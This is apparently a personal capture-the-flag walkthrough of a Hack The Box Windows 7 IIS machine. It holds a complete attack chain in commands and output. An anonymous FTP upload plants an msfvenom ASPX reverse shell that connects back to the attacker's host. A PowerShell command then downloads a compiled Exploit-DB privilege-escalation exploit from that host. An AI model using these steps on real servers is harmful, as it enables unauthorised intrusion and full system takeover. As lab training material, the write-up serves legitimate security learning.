
2_0_50727

iis server - iis7

ftp annon login successful

nmap scan


#### Nmap scan

Nmap all port scan revealed only two ports to be open 21 and 80. Then I proceeded with script and version scans.

```sh
└─$ nmap  -sC -sV -p21,80 10.10.10.5
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-15 13:03 EDT
Nmap scan report for 10.10.10.5
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.29 seconds

```

---
#### FTP

FTP anonymous login was successful (uid: anonymous - pass: anonymous)

There were no interesting files in it. 

But ftp 's root folder is same as web server's

Let us try if we can upload files
```sh
ftp> put flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||49157|)
125 Data connection already open; Transfer starting.
100% |***********************************************************|    34       47.63 KiB/s    --:-- ETA
226 Transfer complete.
34 bytes sent in 00:00 (0.70 KiB/s)
```

```
ftp> ls
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
08-16-23  05:52AM                   34 flag.txt
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
Success.

---
We can upload an aspx shell and execute via web server as the iis server 7.5 supports it

```sh
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.30 LPORT=4444 -o reverse-shell.aspx
```

```sh
ftp> put reverse-shell.aspx
local: reverse-shell.aspx remote: reverse-shell.aspx
229 Entering Extended Passive Mode (|||49167|)
125 Data connection already open; Transfer starting.
100% |***********************************************************|  2805       25.47 MiB/s    --:-- ETA
226 Transfer complete.
2805 bytes sent in 00:00 (53.24 KiB/s)
```

```sh
ftp> ls
229 Entering Extended Passive Mode (|||49168|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
08-16-23  05:52AM                   34 flag.txt
03-17-17  05:37PM                  689 iisstart.htm
08-16-23  05:59AM                 2805 reverse-shell.aspx
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 

```

---
Browse to the location

![[Pasted image 20230816083147.png]]

---
We get a reverse shell

```sh
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
^[[Aconnect to [10.10.14.28] from (UNKNOWN) [10.10.10.5] 49169
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

wwhoami' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

c:\windows\system32\inetsrv>

```

---

```sh
C:\windows\system32\inetsrv>cd C:\Users
cd C:\Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\Users

18/03/2017  02:16 ��    <DIR>          .
18/03/2017  02:16 ��    <DIR>          ..
18/03/2017  02:16 ��    <DIR>          Administrator
17/03/2017  05:17 ��    <DIR>          babis
18/03/2017  02:06 ��    <DIR>          Classic .NET AppPool
14/07/2009  10:20 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)   4.011.515.904 bytes free

```

```sh
C:\Users>cd babis
cd babis
Access is denied.

C:\Users>cd Admnistrator
cd Admnistrator
The system cannot find the path specified.

C:\Users>cd Administrator
cd Administrator
Access is denied.

C:\Users>cd 'Classic .NET AppPool'   
cd 'Classic .NET AppPool'
The system cannot find the path specified.

C:\Users>cd Classic .NET AppPool    
cd Classic .NET AppPool
Access is denied.
```


#### System enumeration
---
```sh
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          16/8/2023, 5:45:12 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.449 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.531 MB
Virtual Memory: In Use:    610 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::d0ff:b3ea:56fd:e26d
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e

```

Hotfix - NA  means this windows machine has never been updated

#### Hunt for exploits
---
We have an unpatched win 7 build 7600

On googleing we get https://www.exploit-db.com/exploits/40564 which has instructions to compile the exploit.

It is a priv esc exploit.

`searchsploit -u` to update searchsploit

use `searchsploit -m 40564` to copy the exploit 

Compile the .c file using the instructions in the exploit
`i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32`

As there is no python, wget or netcat. We can transfer file using powershell

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.10:8000/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
```

Run the exploit form downloads folder and we get root

![[Pasted image 20230927100542.png]]

